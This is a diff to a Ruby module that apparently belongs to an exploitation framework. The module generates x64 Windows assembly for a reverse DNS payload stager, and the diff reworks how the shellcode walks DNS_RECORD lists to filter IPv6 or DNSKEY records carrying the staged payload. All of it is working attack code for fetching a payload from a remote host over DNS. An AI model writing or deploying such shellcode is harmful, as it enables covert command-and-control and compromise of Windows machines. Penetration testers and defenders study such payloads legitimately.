@@ -267,18 +267,22 @@ module Payload::Windows::ReverseDns_x64
          test        eax, eax
          jne         parse_end_br        
          mov         rax, [rsp + 0x30]         
-         push        rax
-         mov         rsi, rsp              ; pointer to DNS_RECORD
+         push        rax 
+         mov         rsi, rsp              ; pointer to DNS_RECORD 
          mov         [rsi], rax            ; ESI < -pointer to DNS_RECORD
+      next_iph:
          mov         rbx, [rsi]            ; EBX < -current pointer
          mov         rdx, [rbx]
          mov         [rsi], rdx            ; save Next IP
-         mov         rdx, rbx
-         ^
+         mov         rdx, rbx  
+         movzx       eax, word ptr [rdx + 0x10]   
+         cmp         eax, #{request_type}
+         jne         next_iph 
+      ^
          
     if req_type == "IPv6" # IPv6 
          
-      asm << %Q^    
+      asm << %Q^  
          add         rdx, 0x20                ; EDX < -IP pointer
          movzx       ecx, byte ptr[rdx + 1]   ; header byte 1
          cmp         cl, 0x81                 ; If this is header flag
@@ -365,17 +369,23 @@ module Payload::Windows::ReverseDns_x64
          push        rax
          mov         rax, [rsp + 0x40]
          push rax
+         
+         
+     ip_enum:
+        mov         rax, [rsp + 8]      ; RAX <-current pointer          
+        test        rax, rax
+        je          copy_end    
+        mov         rbx, [rax]          ; RBX <-next pointer
+        mov         [rsp + 8], rbx      ; save Next IP
+         
+        movzx       edx, word ptr [rax + 0x10]   
+        cmp         edx, #{request_type}
+        jne         ip_enum
+         
       ^
       
     if req_type == "IPv6"     #IPv6
       asm << %Q^     
-      
-      ip_enum:
-         mov         rax, [rsp+8]            
-         test        rax, rax
-         je          copy_end
-         mov         rbx, [rax]          ; RBX <-current pointer
-         mov         [rsp + 8], rbx      ; save Next IP
          mov         rdx, rax
          add         rdx, 0x20           ; RDX <-IP pointer
          xor         rax, rax
@@ -417,10 +427,7 @@ module Payload::Windows::ReverseDns_x64
          jmp         ip_enum
       ^
     else #DNSKEY
-      asm << %Q^ 
-        mov         rax, [rsp + 8]                  ; RAX <-current pointer          
-        test        rax, rax
-        je          copy_end       
+      asm << %Q^            
         mov         ecx, dword ptr ds:[rax + 0x24]  ; RCX <- current size
         test        ecx, ecx 
         je          parse_end_db
